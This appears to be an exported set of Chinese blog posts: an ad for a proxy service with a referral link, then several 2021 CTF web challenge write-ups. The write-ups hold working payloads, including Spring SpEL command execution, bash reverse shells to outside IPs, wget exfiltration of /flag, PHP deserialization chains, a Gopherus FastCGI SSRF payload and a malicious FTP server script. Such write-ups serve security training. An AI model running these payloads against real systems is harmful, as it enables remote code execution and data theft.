[{"title":"10分钟实现科学上网","url":"/2021/10/12/10%E5%88%86%E9%92%9F%E5%AE%9E%E7%8E%B0%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/","content":"前言给大家推荐一个比较实惠的科学上网平台，10RMB/月的套餐100GB流量，可以同时三个人使用（一个终端算一个），反正我自己一个人每个月基本上用不完，windows下支持Clash、Shadowsocks、Netch客户端，MACOS下支持Surge、ClashX、ShadowsocksX，手机就不介绍了，这里我选一个我最常用的客户端Clash 做演示，这个客户端同时支持windows、macos、安卓系统，并且有一个对节点进行测速的功能（经常使用），完美解决了节点不稳定的切换问题。想用其他客户端也可以自己探索，贴个文档https://www-ssrr-pro.gitbook.io/workspace/\n环境windows 10\n准备一个GOGOCloud账号(充值10元)\nClash for Windows 客户端\n官网下载地址\ngithub下载地址\n步骤注册账号并登录贴一个我的邀请地址（会获得一元奖励作为初始资金）注册地址\nhttps://cp.antigfw.net/auth/register?code=U0MM\n\n\n填写相关信息，注意邮箱不要乱填，找回密码的时候用得着。\n注册成功后登录\nhttps://cp.antigfw.net/auth/login\n\n充值并购买套餐打开后是这么个界面\n\n点击右边充值，充个10块钱。\n然后将左边的滚动栏拖到最下面，点击套餐套餐购买。\n\n找到这个套餐购买\n\n里面有个优惠码、订单确认不管它，直接确定。\n购买完成后，接下来安装Clash客户端，导入节点，实现科学上网。\n下载客户端并导入节点实现科学上网 官网下载地址\n打开是这么个界面\n\n接下来返回返回官网，找到\n\n\n可以在Proxies 界面看到节点的列表\n\n进入General界面，配置System Proxy打开。\n\n配置后任务栏的图标会由蓝色变成米白色。\n测试访问Google、Youtube\n\n\n完成。\n如果不明白，可以看官网教程https://www-ssrr-pro.gitbook.io/workspace/windows/clash-for-windows\n最后上外网以查资料学习为主，不要在外网发一些不良言论哈。\n","categories":["教程分享"],"tags":["科学上网"]},{"title":"2021CTF鹤城杯挑战赛WEB-wp","url":"/2021/10/09/2021CTF%E9%B9%A4%E5%9F%8E%E6%9D%AF%E6%8C%91%E6%88%98%E8%B5%9BWEB-wp/","content":"前言web题总共5道，两道sql注入，两道代码审计，一道考CVE利用。这次比赛环境结束就关闭了，导致有些题目无法复现出来。\n比赛复现web-easy_sql 1未找到复现环境\nweb-easy_sql 2未找到复现环境\n题目相关的解题wp\nhttps://threezh1.com/2020/12/06/Mysql8%E6%96%B0%E7%89%B9%E6%80%A7%E7%BB%95%E8%BF%87SELECT%E8%BF%87%E6%BB%A4/\nhttps://anthem-whisper.github.io/p/roarctf-2020/\nweb-Spring考点CVE-2017-4971 利用\n复现过程复现过程\n别的师傅已经复现过，再次一步步写没有多大意义，这里就贴几个关键的payload和关键点截图。\n验证漏洞\n&amp;_T(org.springframework.web.context.request.RequestContextHolder).getRequestAttributes().getResponse().addHeader(&quot;vulnerable&quot;,&quot;True&quot;).aaa=n1nty\n\n![image-20211009113612191](F:\\D-学习笔记\\CTF WP\\image-20211009113612191.png)\n执行命令\n&amp;_T(java.lang.Runtime).getRuntime().exec(&quot;touch /tmp/success&quot;)\n\n&amp;_(new+java.lang.ProcessBuilder(&quot;touch /tmp/success2&quot;)).start()=test\n\n好像没有效果。\n反弹shell\n_(new java.lang.ProcessBuilder(&quot;bash&quot;,&quot;-c&quot;,&quot;bash -i &gt;&amp; /dev/tcp/10.0.0.1/21 0&gt;&amp;1&quot;)).start()=vulhub\n\n比赛就是用的上面的payload，能够执行，这里环境限制，不能截图。\n注意点：比赛过程中，我抓包放到Repeater 中改数据再发送，没有执行成功，经过大师傅指点，直接抓包，修改数据，Forward，成功。好像是因为cstoken的原因。\nweb-middle-magic比赛源码\n&lt;?phphighlight_file(__FILE__);include \"./flag.php\";include \"./result.php\";# aaa的值长度不能大于20if(isset($_GET['aaa']) &amp;&amp; strlen($_GET['aaa']) &lt; 20)&#123;    $aaa = preg_replace('/^(.*)level(.*)$/', '$&#123;1&#125;&lt;!-- filtered --&gt;$&#123;2&#125;', $_GET['aaa']);    echo $aaa;    # $aaa 要有字符串 pass_the_level_1#    if(preg_match('/pass_the_level_1#/', $aaa))&#123;        echo \"here is level 2\";        # admin root_pwd 要定义        if (isset($_POST['admin']) and isset($_POST['root_pwd'])) &#123;            # admin root_pwd 不能等于 ==            if ($_POST['admin'] == $_POST['root_pwd'])                echo '&lt;p&gt;The level 2 can not pass!&lt;/p&gt;';            // START FORM PROCESSING            //  admin root_pwd 要全等于            // 数组绕过?            else if (sha1($_POST['admin']) === sha1($_POST['root_pwd']))&#123;                echo \"here is level 3,do you kown how to overcome it?\";                if (isset($_POST['level_3'])) &#123;                    $level_3 = json_decode($_POST['level_3']);\t\t\t\t\t// &#123;\"result\": 0&#125;                    if ($level_3-&gt;result == $result) &#123;                        echo \"success:\".$flag;                    &#125;                    else &#123;                        echo \"you never beat me!\";                    &#125;                &#125;                else&#123;                    echo \"out\";                &#125;            &#125;            else&#123;                die(\"no\");            &#125;            // perform validations on the form data        &#125;        else&#123;            echo '&lt;p&gt;out!&lt;/p&gt;';        &#125;    &#125;    else&#123;        echo 'nonono!';    &#125;    echo '&lt;hr&gt;';&#125;?&gt;\n\n这道题考的都是基本知识点的组合，直接贴payload\n?aaa=%0apass_the_level_1%23admin[0]=a&amp;root_pwd[1]=b&amp;level_3=&#123;&quot;result&quot;: 0&#125;\n\nweb-easycho本地复现：test6.php\n&lt;?phpinclude 'utils.php';if (isset($_POST['guess'])) &#123;    $guess = (string) $_POST['guess'];    if ($guess === $secret) &#123;        $message = 'Congratulations! The flag is: ' . $flag;    &#125; else &#123;        $message = 'Wrong. Try Again';    &#125;&#125;if (preg_match('/utils\\.php\\/*$/i', $_SERVER['PHP_SELF'])) &#123;    exit(\"hacker :)\");&#125;# url编码绕过if (preg_match('/show_source/', $_SERVER['REQUEST_URI']))&#123;    exit(\"hacker :)\");&#125;if (isset($_GET['show_source'])) &#123;    highlight_file(basename($_SERVER['PHP_SELF']));    exit();&#125;else&#123;    show_source(__FILE__);&#125;?&gt;\n\n这道题，以前做过一次，这道题在原题的基础上多了个匹配show_source的正则。这个正则只需要url编码即可绕过。\npayload\ntest6.php/utils.php/%ff?%73%68%6f%77%5f%73%6f%75%72%63%65\n\n关键点详细解释\n$_SERVER[‘PHP_SELF’] 作用是取当前执行脚本的文件名\n像这样\n来源http://www.iwonder.run/blog/post/during/3691566f7f15\nhttp://www.5idev.com/php/ ：/php/index.phphttp://www.5idev.com/php/index.php ：/php/index.phphttp://www.5idev.com/php/index.php?test=foo ：/php/index.phphttp://www.5idev.com/php/index.php/test/foo ：/php/index.php/test/foo\n\n$_SERVER[‘REQUEST_URI’] 作用URI 用来指定要访问的页面\nhttp://localhost:9999/test6.php/utils.php?source =&gt; /test6.php/utils.php?source\n\nbasename 返回路径中的文件名部分\n官方例子\n&lt;?phpecho \"1) \".basename(\"/etc/sudoers.d\", \".d\").PHP_EOL;echo \"2) \".basename(\"/etc/sudoers.d\").PHP_EOL;echo \"3) \".basename(\"/etc/passwd\").PHP_EOL;echo \"4) \".basename(\"/etc/\").PHP_EOL;echo \"5) \".basename(\".\").PHP_EOL;echo \"6) \".basename(\"/\");?&gt;\n\n1) sudoers2) sudoers.d3) passwd4) etc5) .6)\n\n会输出路径末尾的文件名。\n官方文档\n$path=&apos;/test/äaä.txt&apos;;echo $path.&quot;\\n&quot;;setlocale(LC_ALL,&apos;C&apos;);echo dirname($path).&apos;/&apos;.basename($path).&quot;\\n&quot;;setlocale(LC_ALL,&apos;en_US.iso885915&apos;); // bash: 语言环境 -aecho dirname($path).&apos;/&apos;.basename($path).&quot;\\n&quot;;预期结果：----------------/test/äaä.txt/test/äaä.txt/test/äaä.txt实际结果：--------------/test/äaä.txt/test/aä.txt/test/äaä.txt\n\n这个函数有个小bug，就是遇到非ascii码字符会被丢弃。这就是解题的关键点。所以，我们通过在index.php/utils.php/后面添加一个非ascii码的字符串，这样做可以绕过正则，当执行到basename函数的时候，这个非ascii字符就会被丢弃，就会成功执行utils.php/。\n所以构造payload\ntest6.php/utils.php/%8e?%73%68%6f%77%5f%73%6f%75%72%63%65\n\n\n","categories":["CTF","比赛复盘"],"tags":["SQL注入","反序列化","CVE利用"]},{"title":"11月陇原战疫2021网络安全大赛赛后部分web复现","url":"/2021/11/08/11%E6%9C%88%E9%99%87%E5%8E%9F%E6%88%98%E7%96%AB2021%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E8%B5%9B%E5%90%8E%E9%83%A8%E5%88%86web%E5%A4%8D%E7%8E%B0/","content":"前言打自闭了，一道做不起。\nCheckIN考点go代码审计\n解题过程主要代码\npackage mainimport (    \"fmt\"    \"io\"    \"time\"    \"bytes\"    \"regexp\"    \"os/exec\"    \"plugin\"    \"gopkg.in/mgo.v2\"    \"gopkg.in/mgo.v2/bson\"    \"github.com/gin-contrib/sessions\"    \"github.com/gin-gonic/gin\"    \"github.com/gin-contrib/sessions/cookie\"    \"github.com/gin-contrib/multitemplate\"    \"net/http\")type Url struct &#123;    Url string `json:\"url\" binding:\"required\"`&#125;type User struct &#123;    Username string    Password string&#125;const MOGODB_URI = \"127.0.0.1:27017\"// 中间间：验证登录func MiddleWare() gin.HandlerFunc &#123;    return func(c *gin.Context) &#123;        session := sessions.Default(c)        if session.Get(\"username\") == nil || session.Get(\"password\") != os.Getenv(\"ADMIN_PASS\") &#123;            c.Header(\"Content-Type\", \"text/html; charset=utf-8\")            c.String(200, \"&lt;script&gt;alert('You are not admin!');window.location.href='/login'&lt;/script&gt;\")            return        &#125;        c.Next()    &#125;&#125;// 登录func loginController(c *gin.Context) &#123;    session := sessions.Default(c)    if session.Get(\"username\") != nil &#123;        c.Redirect(http.StatusFound, \"/home\")        return    &#125;    // 拿到前台传入的 用户名和密码    username := c.PostForm(\"username\")    password := c.PostForm(\"password\")    // 判断用户名或密码是否为空    if username == \"\" || password == \"\" &#123;        c.Header(\"Content-Type\", \"text/html; charset=utf-8\")        c.String(200, \"&lt;script&gt;alert('The username or password is empty');window.location.href='/login'&lt;/script&gt;\")        return    &#125;    // 连接数据库    conn, err := mgo.Dial(MOGODB_URI)    if err != nil &#123;        panic(err)    &#125;    defer conn.Close()    conn.SetMode(mgo.Monotonic, true)    db_table := conn.DB(\"ctf\").C(\"users\")    result := User&#123;&#125;    err = db_table.Find(bson.M&#123;\"$where\":\"function() &#123;if(this.username == '\"+username+\"' &amp;&amp; this.password == '\"+password+\"') &#123;return true;&#125;&#125;\"&#125;).One(&amp;result)    if result.Username == \"\" &#123;        c.Header(\"Content-Type\", \"text/html; charset=utf-8\")        c.String(200, \"&lt;script&gt;alert('Login Failed!');window.location.href='/login'&lt;/script&gt;\")        return    &#125;    if username == result.Username || password == result.Password &#123;        session.Set(\"username\", username)        session.Set(\"password\", password)        session.Save()        c.Redirect(http.StatusFound, \"/home\")        return    &#125; else &#123;        c.Header(\"Content-Type\", \"text/html; charset=utf-8\")        c.String(200, \"&lt;script&gt;alert('Pretend you logged in successfully');window.location.href='/login'&lt;/script&gt;\")        return    &#125;&#125;func proxyController(c *gin.Context) &#123;        var url Url    if err := c.ShouldBindJSON(&amp;url); err != nil &#123;        c.JSON(500, gin.H&#123;\"msg\": err&#125;)        return    &#125;    // 匹配     re := regexp.MustCompile(\"127.0.0.1|0.0.0.0|06433|0x|0177|localhost|ffff\")    if re.MatchString(url.Url) &#123;        c.JSON(403, gin.H&#123;\"msg\": \"Url Forbidden\"&#125;)        return    &#125;        client := &amp;http.Client&#123;Timeout: 2 * time.Second&#125;    // 可以进行http请求    resp, err := client.Get(url.Url)    if err != nil &#123;        c.JSON(http.StatusInternalServerError, gin.H&#123;\"error\": err.Error()&#125;)        return    &#125;    defer resp.Body.Close()    var buffer [512]byte    result := bytes.NewBuffer(nil)    for &#123;        n, err := resp.Body.Read(buffer[0:])        result.Write(buffer[0:n])        if err != nil &amp;&amp; err == io.EOF &#123;            break        &#125; else if err != nil &#123;            c.JSON(http.StatusInternalServerError, gin.H&#123;\"error\": err.Error()&#125;)            return        &#125;    &#125;    c.JSON(http.StatusOK, gin.H&#123;\"data\": result.String()&#125;)&#125;func getController(c *gin.Context) &#123;    // 只执行命令 不返回结果    cmd := exec.Command(\"/bin/wget\", c.QueryArray(\"argv\")[1:]...)    err := cmd.Run()    if err != nil &#123;        fmt.Println(\"error: \", err)    &#125;        c.String(http.StatusOK, \"Nothing\")&#125;func createMyRender() multitemplate.Renderer &#123;    r := multitemplate.NewRenderer()    r.AddFromFiles(\"login\", \"templates/layouts/base.tmpl\", \"templates/layouts/login.tmpl\")    r.AddFromFiles(\"home\", \"templates/layouts/home.tmpl\", \"templates/layouts/home.tmpl\")    return r&#125;func main() &#123;    router := gin.Default()    router.Static(\"/static\", \"./static\")    p, err := plugin.Open(\"sess_init.so\")    if err != nil &#123;        panic(err)    &#125;    f, err := p.Lookup(\"Sessinit\")    if err != nil &#123;        panic(err)    &#125;    key := f.(func() string)()    storage := cookie.NewStore([]byte(key))    router.Use(sessions.Sessions(\"mysession\", storage))    router.HTMLRender = createMyRender()    router.MaxMultipartMemory = 8 &lt;&lt; 20    router.GET(\"/\", func(c *gin.Context) &#123;        session := sessions.Default(c)        if session.Get(\"username\") != nil &#123;            c.Redirect(http.StatusFound, \"/home\")              return        &#125; else &#123;            c.Redirect(http.StatusFound, \"/login\")              return        &#125;    &#125;)    router.GET(\"/login\", func(c *gin.Context) &#123;        session := sessions.Default(c)        if session.Get(\"username\") != nil &#123;            c.Redirect(http.StatusFound, \"/home\")              return        &#125;        c.HTML(200, \"login\", gin.H&#123;            \"title\": \"CheckIn\",        &#125;)    &#125;)    router.GET(\"/home\", MiddleWare(), func(c *gin.Context) &#123;        c.HTML(200, \"home\", gin.H&#123;            \"title\": \"CheckIn\",        &#125;)    &#125;)    router.POST(\"/proxy\", MiddleWare(), proxyController)    router.GET(\"/wget\", getController)    router.POST(\"/login\", loginController)    _ = router.Run(\"0.0.0.0:8080\") // listen and serve on 0.0.0.0:8080&#125;\n\n第一次遇到这种题，代码都看不懂，分析半天，看了wp后，发现只需要利用/wget。\npayload\n/wget?argv=1&amp;argv=--post-file&amp;argv=/flag&amp;argv=http://xx.xx.xx.xx:4444\n\n\neaaasyphp考点php反序列化\nFTP-SSRF 攻击 FPM/FastCGI\n解题过程打开 &lt;?phpclass Check &#123;    public static $str1 = false;    public static $str2 = false;&#125;class Esle &#123;    public function __wakeup()    &#123;        Check::$str1 = true;    &#125;&#125;class Hint &#123;    public function __wakeup()&#123;        $this-&gt;hint = \"no hint\";    &#125;    public function __destruct()&#123;        if(!$this-&gt;hint)&#123;            $this-&gt;hint = \"phpinfo\";            ($this-&gt;hint)();        &#125;      &#125;&#125;class Bunny &#123;    public function __toString()    &#123;        if (Check::$str2) &#123;            if(!$this-&gt;data)&#123;                $this-&gt;data = $_REQUEST['data'];            &#125;            file_put_contents($this-&gt;filename, $this-&gt;data);        &#125; else &#123;            throw new Error(\"Error\");        &#125;    &#125;&#125;class Welcome &#123;    public function __invoke()    &#123;        Check::$str2 = true;        return \"Welcome\" . $this-&gt;username;    &#125;&#125;class Bypass &#123;    public function __destruct()    &#123;        if (Check::$str1) &#123;            ($this-&gt;str4)();        &#125; else &#123;            throw new Error(\"Error\");        &#125;    &#125;&#125;if (isset($_GET['code'])) &#123;    unserialize($_GET['code']);&#125; else &#123;    highlight_file(__FILE__);&#125;\n\n分析分析确定了利用点Bunny::file_put_contents($this-&gt;filename, $this-&gt;data);，这里链子的构造也很简单，Bypass::__destruct-&gt;Welcome::__invoke-&gt;Bunny::__toString-&gt;file_put_contents($this-&gt;filename, $this-&gt;data);。但是在Bypass::__destruct里有一个条件Check::$str1，这个$str1默认为false，要想变为true，需要反序列化Esle类，但又没有其他属性可以控制，这道题我到这直接嗝屁，后来问了几位师傅，说是可以自己构造属性来调用Else，我纳闷还有这种操作，我以为反序列化只能控制已经定义的属性，这次真的又学到了。\n直接贴payload\n&lt;?phpclass Check &#123;    public static $str1 = false;    public static $str2 = false;&#125;class Esle &#123;    // __wakeup()，执行unserialize()时，先会调用这个函数    public function __wakeup()    &#123;        Check::$str1 = true;    &#125;&#125;class Bunny &#123;    public function __toString()    &#123;        echo \"__toString\";        if (Check::$str2) &#123;            if(!$this-&gt;data)&#123;                $this-&gt;data = $_REQUEST['data'];            &#125;            // 利用点            // Bypass::__destruct-&gt;Welcome::__invoke-&gt;Bunny::__toString            file_put_contents($this-&gt;filename, $this-&gt;data);        &#125; else &#123;            throw new Error(\"Error\");        &#125;    &#125;&#125;class Welcome &#123;    // __invoke()，调用函数的方式调用一个对象时的回应方法    public function __invoke()    &#123;        echo \"__invoke\";        Check::$str2 = true;        return \"Welcome\" . $this-&gt;username;    &#125;&#125;class Bypass &#123;    public function __construct()    &#123;        // 自己构造        $this-&gt;esle = new Esle();    &#125;    public function __destruct()    &#123;        echo \"__destruct\";        if (Check::$str1) &#123;            // $this-&gt;str4 Welcome            ($this-&gt;str4)();        &#125; else &#123;            throw new Error(\"Error\");        &#125;    &#125;&#125;$b1 = new Bunny();$b1-&gt;data = \"123\";$b1-&gt;filename = \"1.txt\";$we = new Welcome();$we-&gt;username = $b1;$by = new Bypass();$by-&gt;str4 = $we;echo serialize($by);\n\nO:6:&quot;Bypass&quot;:2:&#123;s:4:&quot;esle&quot;;O:4:&quot;Esle&quot;:0:&#123;&#125;s:4:&quot;str4&quot;;O:7:&quot;Welcome&quot;:1:&#123;s:8:&quot;username&quot;;O:5:&quot;Bunny&quot;:2:&#123;s:4:&quot;data&quot;;s:3:&quot;123&quot;;s:8:&quot;filename&quot;;s:5:&quot;1.txt&quot;;&#125;&#125;&#125;\n\n在本地搭建环境进行测试\n\n可以正常写入\n但是放在比赛环境里就不能写入，猜测应该是没有写入权限。\n看了wp，利用了file_put_contents($this-&gt;filename, $this-&gt;data)这里，直接通过SSRF 攻击 FPM/FastCGI。\n攻击步骤首先通过gopherus脚本生成payload\nf:\\Tools\\WEB\\Python-Tools\\Gopherus-master&gt; python gopherus.py --exploit fastcgi  ________              .__ /  _____/  ____ ______ |  |__   ___________ __ __  ______/   \\  ___ /  _ \\\\____ \\|  |  \\_/ __ \\_  __ \\  |  \\/  ___/\\    \\_\\  (  &lt;_&gt; )  |_&gt; &gt;   Y  \\  ___/|  | \\/  |  /\\___ \\ \\______  /\\____/|   __/|___|  /\\___  &gt;__|  |____//____  &gt;        \\/       |__|        \\/     \\/                 \\/                author: $_SpyD3r_$Give one file name which should be surely present in the server (prefer .php file)if you don't know press ENTER we have default one:  /var/www/html/index.phpTerminal command to run:  bash -c \"bash -i &gt;&amp; /dev/tcp/vpsip/4444 0&gt;&amp;1\"Your gopher link is ready to do SSRF:gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%05%05%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH103%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00g%04%00%3C%3Fphp%20system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/vpsip/4444%200%3E%261%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00-----------Made-by-SpyD3r-----------\n\n用下面这段\n%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%05%05%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH103%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00g%04%00%3C%3Fphp%20system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/vpsip/4444%200%3E%261%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00\n\n接下来将这段payload带入序列化\n&lt;?phpclass Check &#123;    public static $str1 = false;    public static $str2 = false;&#125;class Esle &#123;    // __wakeup()，执行unserialize()时，先会调用这个函数    public function __wakeup()    &#123;        Check::$str1 = true;    &#125;&#125;class Bunny &#123;    public function __toString()    &#123;        echo \"__toString\";        if (Check::$str2) &#123;            if(!$this-&gt;data)&#123;                $this-&gt;data = $_REQUEST['data'];            &#125;            // 利用点            // Bypass::__destruct-&gt;Welcome::__invoke-&gt;Bunny::__toString            file_put_contents($this-&gt;filename, $this-&gt;data);        &#125; else &#123;            throw new Error(\"Error\");        &#125;    &#125;&#125;class Welcome &#123;    // __invoke()，调用函数的方式调用一个对象时的回应方法    public function __invoke()    &#123;        echo \"__invoke\";        Check::$str2 = true;        return \"Welcome\" . $this-&gt;username;    &#125;&#125;class Bypass &#123;    public function __construct()    &#123;        // 自己构造        $this-&gt;esle = new Esle();    &#125;    public function __destruct()    &#123;        echo \"__destruct\";        if (Check::$str1) &#123;            // $this-&gt;str4 Welcome            ($this-&gt;str4)();        &#125; else &#123;            throw new Error(\"Error\");        &#125;    &#125;&#125;$b1 = new Bunny();$b1-&gt;data = urldecode(\"%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%05%05%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH103%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00g%04%00%3C%3Fphp%20system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/121.4.65.44/4444%200%3E%261%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00\");$b1-&gt;filename = \"ftp://aaa@121.4.65.44:23/123\";$we = new Welcome();$we-&gt;username = $b1;$by = new Bypass();$by-&gt;str4 = $we;echo urlencode(serialize($by));\n\n得到\nO%3A6%3A%22Bypass%22%3A2%3A%7Bs%3A4%3A%22esle%22%3BO%3A4%3A%22Esle%22%3A0%3A%7B%7Ds%3A4%3A%22str4%22%3BO%3A7%3A%22Welcome%22%3A1%3A%7Bs%3A8%3A%22username%22%3BO%3A5%3A%22Bunny%22%3A2%3A%7Bs%3A4%3A%22data%22%3Bs%3A413%3A%22%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%05%05%00%0F%10SERVER_SOFTWAREgo+%2F+fcgiclient+%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP%2F1.1%0E%03CONTENT_LENGTH103%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include+%3D+On%0Adisable_functions+%3D+%0Aauto_prepend_file+%3D+php%3A%2F%2Finput%0F%17SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Findex.php%0D%01DOCUMENT_ROOT%2F%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00g%04%00%3C%3Fphp+system%28%27bash+-c+%22bash+-i+%3E%26+%2Fdev%2Ftcp%2F121.4.65.44%2F4444+0%3E%261%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00%22%3Bs%3A8%3A%22filename%22%3Bs%3A28%3A%22ftp%3A%2F%2Faaa%40121.4.65.44%3A23%2F123%22%3B%7D%7D%7D\n\n接下来在vps上运行恶意ftp服务器\n脚本如下\nimport sockets = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.bind(('0.0.0.0', 23))s.listen(1)conn, addr = s.accept()conn.send(b'220 welcome\\n')#Service ready for new user.#Client send anonymous username#USER anonymousconn.send(b'331 Please specify the password.\\n')#User name okay, need password.#Client send anonymous password.#PASS anonymousconn.send(b'230 Login successful.\\n')#User logged in, proceed. Logged out if appropriate.#TYPE Iconn.send(b'200 Switching to Binary mode.\\n')#Size /conn.send(b'550 Could not get the file size.\\n')#EPSV (1)conn.send(b'150 ok\\n')#PASVconn.send(b'227 Entering Extended Passive Mode (127,0,0,1,0,9000)\\n') #STOR / (2)conn.send(b'150 Permission denied.\\n')#QUITconn.send(b'221 Goodbye.\\n')conn.close()\n\n再用nc监听4444端口\n\n最后，只需要提交反序列化得到的payload\n\nEasyJaba目前未找到wp\n","categories":["CTF","比赛复盘"],"tags":["反序列化","代码审计"]},{"title":"2021年“绿盟杯”重庆市大学生信息安全竞赛部分wp","url":"/2021/10/23/2021%E5%B9%B4%E2%80%9C%E7%BB%BF%E7%9B%9F%E6%9D%AF%E2%80%9D%E9%87%8D%E5%BA%86%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E9%83%A8%E5%88%86wp/","content":" \nMISC（MISC和Crypto队友做的）签到题base64，找个网站解密一下就出来了\nHuahua解压后得到png图片，打不开，用winhex打开，发现文件头缺少了，添加png文件头，调整图片高度得到flag\nNoise解压后得到三个文件，发现\n\n这个文件有点可疑，联想noise改后缀为.wav，用Audacity打开此文件，\n\n \n \ncypto签到2根据古罗马提示得知是：凯撒密码其中为位移3\nEasy-rsa得知e，n，dp，c，求m\n\n跑出来结果为：\n\nWEBflag在哪里&lt;?phperror_reporting(0);class begin&#123;    public $file;    public $mode;    public $content;    public $choice;    public function __construct()    &#123;        $this-&gt;file = \"file\";        $this-&gt;content = \"content\";    &#125;    function __wakeup()    &#123;        if($this-&gt;mode==\"write\")&#123;            $this-&gt;choice= new write();        &#125;        if($this-&gt;mode==\"read\")&#123;            $this-&gt;choice= new read();        &#125;    &#125;    // __call()，在对象中调用一个不可访问方法时调用    function __call($file,$content) &#123;        // 利用点        highlight_file($this-&gt;file);    &#125;    function __destruct()&#123;        if($this-&gt;mode==\"write\")&#123;            // 触发 __call            $this-&gt;choice-&gt;writewritetxt($this-&gt;file,$this-&gt;content);        &#125;        else&#123;            $this-&gt;choice-&gt;open($this-&gt;file);        &#125;    &#125;&#125;class write&#123;    public function writewritetxt($file,$content)    &#123;        $filename=$file.\".txt\"; // 拼接了后缀        if(is_file($filename))&#123;            unlink($filename);        &#125;        // 利用点：不可利用        file_put_contents($filename, $content);        echo \"成功写入\";    &#125;&#125;class read&#123;    public $file;    public function __construct()&#123;        $this-&gt;file=\"test.txt\";        echo \"欢迎查看  \".$this-&gt;file.\"&lt;br/&gt;\";    &#125;    function open($filename)&#123;        $file=$this-&gt;file;        if(is_file($file))&#123;            if($file==\"getflag.php\")&#123;                die(\"getflag.php没东西\");            &#125;            else&#123;                // 利用点：不可利用                // 伪协议读取：但是 if_file不通过就执行不了                //                highlight_file($file);            &#125;        &#125;else&#123;            echo \"文件不存在\";        &#125;    &#125;&#125;function check($dis_content)&#123;    if(preg_match('/system|eval|wget|exec|zip|passthru|netcat|phpinfo|`|shell|\\(|\\)/i', $dis_content))&#123;        die(\"hack !!!\");    &#125;&#125;$pop=$_GET['pop'];if (isset($pop)) &#123;    check($pop);    unserialize($pop);&#125; else &#123;    highlight_file(\"index.php\");&#125;?&gt;\n\npayload\n?pop=O:5:&quot;begin&quot;:5:&#123;s:4:&quot;file&quot;;s:11:&quot;getflag.php&quot;;s:4:&quot;mode&quot;;s:5:&quot;write&quot;;s:7:&quot;content&quot;;s:0:&quot;&quot;;s:6:&quot;choice&quot;;O:5:&quot;begin&quot;:4:&#123;s:4:&quot;file&quot;;s:11:&quot;getflag.php&quot;;s:4:&quot;mode&quot;;s:5:&quot;write&quot;;s:7:&quot;content&quot;;s:0:&quot;&quot;;s:6:&quot;choice&quot;;N;&#125;&#125;\n\nmid文件包含，使用php://filter在根目录包含出flag即可\nhttp://119.61.19.212:57303/index.php?1=php://filter/read=convert.base64-encode/resource=../../../flag\n\n寻宝奇兵第一关：$hash可控 $users可控 $SECRET也知道        $users 随便传，只要不是explorer，再让$SECRET跟$users拼接，然后md5加密        将得到的结果通过$_COOKIE[“hash”]传入，将构造的$users传入，即可进入第二关。\n第二关：参照 http://www.oriole.fun/index.php/archives/31/ 进入第三关\n第三关：PCRE回溯次数绕过\nimport requestsfrom io import BytesIOdata = &#123;  'treasure': BytesIO(b'flag.php' + b' a' * 1000000)&#125;res = requests.post('http://119.61.19.217:57305/treasure.php', data=data)print(res.text)\n\nSerialize&lt;?phperror_reporting(0);highlight_file(__FILE__);class Demo&#123;    public $class;    public $user;    public function __construct()    &#123;        $this-&gt;class = \"safe\";        $this-&gt;user = \"ctfer\";        $context = new $this-&gt;class ($this-&gt;user);        foreach($context as $f)&#123;            echo $f;        &#125;    &#125;    public function __wakeup()    &#123;        $context = new $this-&gt;class ($this-&gt;user);        foreach($context as $f)&#123;            echo $f;        &#125;    &#125;&#125;class safe&#123;    var $user;    public function __construct($user)    &#123;        $this-&gt;user = $user;        echo (\"hello \".$this-&gt;user);    &#125;&#125;if(isset($_GET['data']))&#123;    